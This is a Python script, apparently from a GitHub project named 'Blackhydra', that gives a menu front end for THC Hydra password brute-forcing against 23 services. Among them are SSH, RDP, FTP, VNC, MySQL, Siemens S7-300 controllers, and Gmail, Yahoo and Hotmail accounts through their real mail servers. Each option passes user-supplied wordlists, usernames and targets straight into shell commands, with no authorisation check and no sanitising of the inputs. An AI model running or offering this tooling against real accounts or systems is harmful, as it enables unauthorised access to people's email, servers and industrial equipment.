#!/usr/bin/python
# Blackhydra Bruteforcers
# Mod by The Sixty Nine
# Github: github.com/thesixtynine/Blackhydra

"""
This program is just a small program to shorten brute force sessions on BlackHydra :)
But to be more satisfying results of the brute force. You better interact dire | ctly with BlackHydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).

"""
import sys, os, time

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()


def write(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)

logo = """\033[1;77m
      _____ _         _      _____       _
     | __  | |___ ___| |_   |  |  |_ _ _| |___ ___
     | __ -| | .'|  _| '_|  |     | | | . |  _| .'|
     |_____|_|__,|___|_,_|  |__|__|_  |___|_| |__,|
                                  |___|
"""

print (logo)

print ("\033[0m[\033[1;94m#\033[0m] \033[77mTHC Hydra BruteForcers")
print ("\033[0m[\033[1;93m*\033[0m] \033[77mMod by The Sixty Nine")
print ("\033[0m[\033[1;96m*\033[0m] \033[77mMy Github: @thesixtynine")
time.sleep(1)
print
print ("\033[0m[\033[1;92m01\033[0m] \033[1;77mCisco    \033[0m[\033[1;92m07\033[0m] \033[1;77mTelnet    \033[0m[\033[1;92m13\033[0m] \033[1;77mImap     \033[0m[\033[1;92m19\033[0m] \033[1;77mRedis  ")
print ("\033[0m[\033[1;92m02\033[0m] \033[1;77mVNC      \033[0m[\033[1;92m08\033[0m] \033[1;77mYahoo     \033[0m[\033[1;92m14\033[0m] \033[1;77msshKey   \033[0m[\033[1;92m20\033[0m] \033[1;77mPywhere")
print ("\033[0m[\033[1;92m03\033[0m] \033[1;77mFTP      \033[0m[\033[1;92m09\033[0m] \033[1;77mHotmail   \033[0m[\033[1;92m15\033[0m] \033[1;77mPop3     \033[0m[\033[1;92m21\033[0m] \033[1;77mNntp   ")
print ("\033[0m[\033[1;92m04\033[0m] \033[1;77mGmail    \033[0m[\033[1;92m10\033[0m] \033[1;77mRouter    \033[0m[\033[1;92m16\033[0m] \033[1;77mRexec    \033[0m[\033[1;92m22\033[0m] \033[1;77ms7-300 ")
print ("\033[0m[\033[1;92m05\033[0m] \033[1;77mSSH      \033[0m[\033[1;92m11\033[0m] \033[1;77mRDP       \033[0m[\033[1;92m17\033[0m] \033[1;77mXmpp     \033[0m[\033[1;92m23\033[0m] \033[1;77mSocks5 ")
print ("\033[0m[\033[1;92m06\033[0m] \033[1;77mTeam     \033[0m[\033[1;92m12\033[0m] \033[1;77mMySQL     \033[0m[\033[1;92m18\033[0m] \033[1;77mAdam     \033[0m[\033[1;92m00\033[0m] \033[1;77mExit   ")
print
option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mSelect an option: \033[0m")

if option == '01' or option == '1':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -P %s %s cisco" % (word, iphost))
        print
        sys.exit(1)

elif option == '02' or option == '2':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
        print
        sys.exit(1)

elif option == '03' or option == '3':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '04' or option == '4':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        email = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mEmail: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        print
        os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
        print
        sys.exit(1)

elif option == '05' or option == '5':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '06' or option == '6':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '07' or option == '7':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '08' or option == '8':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        email = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mEmail: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        print
        os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        print
        sys.exit(1)

elif option == '09' or option == '9':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        email = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mEmail: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        print
        os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
        print
        sys.exit(1)

elif option == '10':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '11':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '12':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        print
        os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
        print
        sys.exit(1)

elif option == '13':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -p %s %s imap" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '14':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s -s 8676 %s sshkey" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '15':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s pop3" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '16':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s rexec" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '17':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s xmpp" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '18':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -P %s %s adam6500" % (word, iphost))
        print
        sys.exit(1)

elif option == '19':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -P %s %s redis" % (word, iphost))
        print
        sys.exit(1)

elif option == '20':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s pcanywhere" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '21':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s nntp" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '22':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -P %s %s s7-300" % (word, iphost))
        print
        sys.exit(1)

elif option == '23':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        print
        os.system("hydra -l %s -P %s %s socks5" % (user, word, iphost))
        print
        sys.exit(1)

elif option == '00' or option == '0':
        print ("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mExit the program!")
        print
        sys.exit(1)

else:
        print ("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mInvalid option!")
        print
        time.sleep(1)
        restart_program()
